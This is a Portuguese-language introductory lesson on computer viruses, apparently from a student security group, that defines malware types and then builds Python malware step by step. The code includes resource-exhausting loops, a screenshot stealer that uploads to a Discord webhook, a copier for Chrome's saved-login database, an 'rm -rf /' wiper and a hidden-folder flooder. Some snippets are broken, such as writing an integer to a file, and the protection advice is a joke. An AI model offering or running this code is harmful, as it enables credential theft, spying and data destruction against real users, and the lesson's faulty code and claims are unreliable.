
# Introdução a virus e malwares

## O que é um vírus de computador?

"Um vírus de computador é um programa malicioso que se propaga infectando outros programas e arquivos. Ele pode se espalhar por meio de anexos de e-mail, downloads de arquivos, pen drives e outros dispositivos de armazenamento. Os vírus de computador podem causar danos ao sistema operacional, roubar informações pessoais e até mesmo danificar o hardware do computador." (Fonte: [Kaspersky](https://www.kaspersky.com.br/resource-center/threats/computer-viruses))

"Virus é um arquivo que quando executado ele vai prejudicar seu computador de alguma forma." (Fonte: Arial 15, Maraba)

## Tipos de vírus

### Worms

Os worms são programas maliciosos que se propagam automaticamente pela rede, explorando vulnerabilidades em sistemas operacionais e softwares. Eles podem se espalhar rapidamente e causar danos significativos a computadores e redes.

### Cavalos de Troia (Trojans)

Os cavalos de Troia são programas maliciosos que se disfarçam de software legítimo para enganar os usuários. Eles podem roubar informações pessoais, instalar outros malwares e abrir portas para invasores.

### Ransomware

O ransomware é um tipo de malware que criptografa arquivos e exige um resgate para liberar o acesso aos dados. Ele pode se espalhar por e-mails, downloads maliciosos e vulnerabilidades de software.

### Spyware

O spyware é um tipo de malware que monitora as atividades do usuário sem o seu consentimento. Ele pode coletar informações pessoais, como senhas, histórico de navegação e dados bancários.

### Adware

O adware é um tipo de malware que exibe anúncios indesejados no computador do usuário. Ele pode causar lentidão no sistema, redirecionar para sites maliciosos e coletar informações de navegação.

### Botnets

As botnets são redes de computadores infectados controlados por um invasor. Elas podem ser usadas para enviar spam, ataques de negação de serviço (DDoS) e roubo de informações.

### RAT (Remote Access Trojan - Cavalo de Troia de Acesso Remoto)

O RAT é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.

Esse malware também é chamado de Remote Administration Tools (Ferramenta de Administração Remota).

### Keylogger

O keylogger é um tipo de malware que registra as teclas digitadas pelo usuário, capturando senhas, mensagens e outras informações confidenciais. Ele pode ser usado para roubo de identidade e espionagem.

## Como se proteger de vírus e malwares?

**Não seja burro!!**


## Vamos criar o nosso

Agora que entendemos um pouco sobre vírus e malwares, vamos criar o nosso próprio malware!

Como essa é uma aula introdutória, vamos criar um malware simples

**DISCLAIMER:** Essa aula é apenas para fins educacionais e não deve ser usada para prejudicar outras pessoas. O uso de malware é ilegal e pode resultar em consequências legais graves. ;)

### Como poderia ser um simples malware?

Bom, como eu disse, malwares são programas maliciosos que podem causar danos ao sistema operacional, roubar informações pessoais e até mesmo danificar o hardware do computador. Então, vamos fazer algo simples, um programa que apenas trava o computador. O jeito mais simples de fazer isso é criar um loop infinito que consome toda a CPU.

```python
while True:
    pass
```

Esse código em Python cria um loop infinito que não faz nada, apenas consome recursos do computador. Se você executar esse código em um computador, ele vai travar e você terá que reiniciá-lo para recuperar o controle. Mas se por exemplo esse codigo for feito no vscode ou qualquer outra IDE, a IDE vai travar e você terá que fechar a IDE e abrir novamente, mas o computador não.

Bom, ja vimos que um loop infinito pode fazer um leve dano, vamos melhora-lo um pouco.

```python
i = 0
while True:
    i += 1
```

Agora, o loop infinito incrementa uma variável a cada iteração. Isso consome mais recursos do computador e pode causar lentidão no sistema. Tem alguma ideia de como melhorar? 

```python
i = 0
while True:
    i += 1
    print(i)
```

Agora, o loop infinito imprime o valor da variável a cada iteração. Isso pode causar um consumo ainda maior de recursos e travar o sistema. Mas, o que pode ser melhor que um print? Ah sim, arquivos...

```python
i = 0
while True:
    i += 1
    with open(f'arquivo_{i}.txt', 'w') as f:
        f.write('InsperSec')
```

Ok, agora temos um arquivo infinito, mas ele vai demorar muito para fazer um dano significativo. Vamos melhorar isso.

```python
i = 0
while True:
    i += 1
    with open(f'arquivo_{i}.txt', 'w') as f:
        f.write(i**i)
```

Agora sim, o arquivo vai crescer exponencialmente e consumir cada vez mais espaço em disco. Isso pode causar uma lentidão significativa no sistema e até mesmo travá-lo. Mas, ainda podemos melhorar...

```python
import os

i = 0
while True:
    i += 1
    with open(f'arquivo_{i}.txt', 'w') as f:
        f.write(i**i)
    os.system(f'rm arquivo_{i}.txt')
```

Agora, o malware cria um arquivo exponencialmente crescente e, em seguida, o exclui. Isso pode causar um grande consumo de recursos e danos ao sistema de arquivos.

Dar danos no computador é legal, mas e se quisermos roubar informações pessoais? Vamos criar um malware que captura a tela do usuário!

```python
import pyautogui
import requests

discord_webhook = 'https://discord.com/api/webhooks/1234567890/ABCDEFGHIJKLMN'

def send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    files = {'file': open('screenshot.png', 'rb')}
    requests.post(discord_webhook, files=files)

send_screenshot()
```


Bom, ja vimos que temos muito potencial, mas e se quisermos fazer algo mais sofisticado? Vamos criar um malware que rouba senhas do navegador!

```python
import os
import shutil

def steal_passwords():
    path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'
    shutil.copy(path, 'senhas.db')

steal_passwords()

```

Agora você tem noção de como um malware pode ser perigoso. Por exemplo, e se fizermos algo que pode deletar completamente o sistema operacional?

```python
import os

def delete_system():
    os.system('rm -rf /')

delete_system()
```

Ok, isso sim é um malware perigoso. Ele deleta todos os arquivos do sistema operacional, causando uma perda irreparável de dados.

Para uma primeira aula com virus e malwares, acho que já é o suficiente. Mas como prometido, eu vou mostrar um virus engracado que eu fiz. Ele cria pastas infinitas dentro de um diretorio. E ainda por cima, ele esconde as pastas com o atributo de sistema.

```python
import os

def create_folders():
    i = 0
    while True:
        i += 1
        os.mkdir(f'pasta_{i}')
        os.system(f'attrib +s +h pasta_{i}')

create_folders()
```